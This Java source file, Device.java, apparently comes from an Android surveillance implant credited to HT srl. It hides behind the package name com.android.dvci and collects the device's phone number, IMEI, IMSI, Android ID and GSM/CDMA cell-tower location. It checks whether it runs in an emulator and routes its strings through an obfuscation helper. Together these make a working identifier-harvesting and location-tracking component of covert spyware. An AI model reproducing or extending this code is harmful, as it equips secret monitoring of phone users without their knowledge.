/* *********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 06-dec-2010
 **********************************************/
package com.android.dvci;

import android.content.Context;
import android.os.Build;
import android.provider.Settings.Secure;
import android.telephony.CellLocation;
import android.telephony.PhoneNumberUtils;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.mm.M;

// TODO: Auto-generated Javadoc
/**
 * The Class Device.
 */
public class Device {
	private static final String TAG = "Device"; //$NON-NLS-1$

	public static final String UNKNOWN_NUMBER = "";

	/** The singleton. */
	private volatile static Device singleton;

	/**
	 * Self.
	 * 
	 * @return the device
	 */
	public static Device self() {
		if (singleton == null) {
			synchronized (Device.class) {
				if (singleton == null) {
					singleton = new Device();
				}
			}
		}

		return singleton;
	}

	/**
	 * Gets the phone number.
	 * 
	 * @return the phone number
	 */
	public String getPhoneNumber() {
		try {
			TelephonyManager mTelephonyMgr;
			mTelephonyMgr = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);

			String number = mTelephonyMgr.getLine1Number();
			if (isPhoneNumber(number) ) {
				return number;
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPhoneNumber) Error: " + ex);
			}
		}

		return UNKNOWN_NUMBER;
	}

	private boolean isPhoneNumber(String number) {
		if(number == null || number.length() == 0) {
			return false;
		}

		return PhoneNumberUtils.isGlobalPhoneNumber(number);
	}

	/**
	 * Gets the version.
	 * 
	 * @return the version
	 */
	public byte[] getVersion() {
		final byte[] versionRet = ByteArray.intToByteArray(Version.VERSION);

		if (Cfg.DEBUG) {
			Check.ensures(versionRet.length == 4, "Wrong version len"); //$NON-NLS-1$
		}

		return versionRet;
	}

	/**
	 * Check. if is CDMA. //$NON-NLS-1$
	 * 
	 * @return true, if is CDMA
	 */
	public static boolean isCdma() {
		return false;
	}

	public static boolean isGprs() {
		return true;
	}

	public boolean isSimulator() {
		// return getDeviceId() == "9774d56d682e549c";
		return Build.PRODUCT.startsWith(M.e("sdk")); //$NON-NLS-1$
	}

	/**
	 * Gets the imei.
	 * 
	 * @return the imei
	 */
	public String getImei() {
		final TelephonyManager telephonyManager;

		try {
			telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getImei) Error: " + ex);
			}

			return "";
		}

		String imei = telephonyManager.getDeviceId();

		if (imei == null || imei.length() == 0) {
			imei = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
			if (imei == null || imei.length() == 0) {
				imei = M.e("N/A"); //$NON-NLS-1$
			}
		}

		return imei;
	}

	/**
	 * Gets the imsi.
	 * 
	 * @return the imsi
	 */
	public String getImsi() {
		final TelephonyManager telephonyManager;

		try {
			telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getImei) Error: " + ex);
			}

			return "";
		}

		String imsi = telephonyManager.getSubscriberId();

		if (imsi == null) {
			imsi = M.e("UNAVAILABLE"); //$NON-NLS-1$
		}

		return imsi;
	}

	public static CellInfo getCellInfo() {
		final android.content.res.Configuration conf = Status.getAppContext().getResources().getConfiguration();
		final TelephonyManager tm;

		final CellInfo info = new CellInfo();

		try {
			tm = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getImei) Error: " + ex);
			}

			return info;
		}

		if (tm.getSimState() == TelephonyManager.SIM_STATE_ABSENT) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getCellInfo): no sim");
			}
			return info;
		} 

		final CellLocation bcell = tm.getCellLocation();

		if (bcell == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + M.e(" Error: ") + M.e("null cell")); //$NON-NLS-1$ //$NON-NLS-2$
			}

			return info;
		}

		final int rssi = 0; // TODO aggiungere RSSI

		if (bcell instanceof GsmCellLocation) {
			if (Cfg.DEBUG) {
				Check.asserts(Device.isGprs(), M.e("gprs or not?")); //$NON-NLS-1$
			}
			final GsmCellLocation cell = (GsmCellLocation) bcell;

			info.setGsm(conf.mcc, conf.mnc, cell.getLac(), cell.getCid(), rssi);

			if (Cfg.DEBUG) {
				Check.log(TAG + M.e(" info: ") + info.toString()); //$NON-NLS-1$
			}

		}

		if (bcell instanceof CdmaCellLocation) {
			if (Cfg.DEBUG) {
				Check.asserts(Device.isCdma(), M.e("cdma or not?")); //$NON-NLS-1$
			}
			final CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();

			info.setCdma(cell.getSystemId(), cell.getNetworkId(), cell.getBaseStationId(), rssi);
			info.cdma = true;
			info.valid = true;

			info.sid = cell.getSystemId();
			info.nid = cell.getNetworkId();
			info.bid = cell.getBaseStationId();

			if (Cfg.DEBUG) {
				Check.log(TAG + M.e(" info: ") + info.toString()); //$NON-NLS-1$
			}

		}

		return info;
	}

}
